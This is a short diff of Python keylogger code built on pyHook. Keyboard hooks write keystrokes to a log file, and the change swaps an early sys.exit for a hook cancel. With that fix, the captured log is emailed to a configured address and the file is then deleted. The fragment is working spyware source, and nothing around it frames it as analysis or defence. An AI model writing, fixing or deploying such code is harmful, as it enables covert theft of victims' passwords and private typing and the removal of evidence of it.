@@ -187,7 +187,7 @@ try:
 
         if event.Ascii==59:
           fob.close
-          sys.exit(0)
+          hooks_manager.cancel()
           send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
           os.remove(log_file)        
 
@@ -211,7 +211,7 @@ try:
           fob.close
           hooks_manager.cancel()
           send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
-          os.remove(log_file)        
+          os.remove(log_file)
 
       hooks_manager = pyHook.HookManager()
       hooks_manager.KeyDown = OnKeyboardEvent
